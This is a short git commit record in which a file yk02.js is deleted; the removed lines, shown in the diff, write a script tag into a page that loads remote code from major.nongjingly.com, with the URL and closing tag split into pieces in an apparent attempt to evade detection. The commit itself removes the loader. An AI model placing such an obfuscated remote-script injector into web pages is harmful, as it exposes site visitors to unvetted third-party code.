f26526049c5f705d0cf309e5c25eb38775df7caa
jisucdn <79298333+jisucdn@users.noreply.github.com>
2021-10-21 19:59:52 +0800

    Delete yk02.js

--- yk02.js
+++
@@ -1,4 +0,0 @@
-document.writeln('<script id="EX8NDYGmQ2JpXxHkQYLuUV" src="ht')
-document.writeln('tps:')
-document.writeln('//major.nongjingly.com/142/EX8NDYGmQ2JpXxHkQYLuUV.shtml?'+new Date().getTime()+'"')
-document.writeln('><\/scr' + 'ipt>')
